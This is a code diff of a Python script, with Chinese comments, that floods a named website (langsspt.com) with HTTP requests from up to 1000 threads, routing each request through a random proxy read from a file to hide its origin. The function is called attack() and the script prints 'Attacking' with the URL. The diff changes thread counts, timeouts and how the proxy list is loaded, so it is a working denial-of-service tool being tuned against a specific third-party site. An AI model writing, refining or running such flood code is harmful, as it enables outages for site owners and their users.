@@ -12,7 +12,7 @@ import random
 # 测试的地址
 url = 'http://www.langsspt.com/'
 # 同时运行的线程数 （每个电脑能开的线程数不同（我：893个线程），如果超过了系统的最大负荷，则只创建能创建的最大线程数）
-THREADS_COUNT = 2000
+THREADS_COUNT = 1000
 # 已创建的线程数
 CREATED_THREAD = 0
 # 死亡的线程数
@@ -20,18 +20,7 @@ DEAD_THREAD = 0
 
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
              (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'
-readyIp = ['111.12.251.169:80',
-            '111.12.251.172:80',
-            '111.12.251.173:80',
-            '111.12.251.174:80',
-            '111.12.251.207:80',
-            '111.12.251.213:80',
-            '117.135.250.133:80',
-            '117.135.250.134:80',
-            '120.192.92.98:80',
-            '183.245.146.62:80',
-            '211.143.146.231:80',
-            '221.130.13.238:80']
+readyIp = open('proxyIp.txt', 'r').readlines()
 
 
 class ProxyThread(threading.Thread):
@@ -50,10 +39,10 @@ class ProxyThread(threading.Thread):
     def attack(self):
         req = urllib.request.Request(url)
         req.add_header('User-Agent', user_agent)
-        i = math.floor(random.random()*len(readyIp))
-        socket.setdefaulttimeout(10)  # 超时未响应则抛出timeout异常
+        i = math.floor(random.random()*(len(readyIp)-1))
+        socket.setdefaulttimeout(5)  # 超时未响应则抛出timeout异常
         try:
-            proxy_handler = urllib.request.ProxyHandler({'http': readyIp[i]})
+            proxy_handler = urllib.request.ProxyHandler({'http': readyIp[i].replace('\n','')})
             proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
             opener = urllib.request.build_opener(proxy_handler, proxy_auth_handler)
             # 添加头信息
@@ -74,4 +63,4 @@ try:
 except:
     print('线程数已达上限：', CREATED_THREAD, '个')
 finally:
-    print(time.strftime('%Y-%m-%d %H:%M:%S'), ':', 'attacking', url, '....')
+    print(time.strftime('%Y-%m-%d %H:%M:%S'), ':', 'Attacking', url, '....')
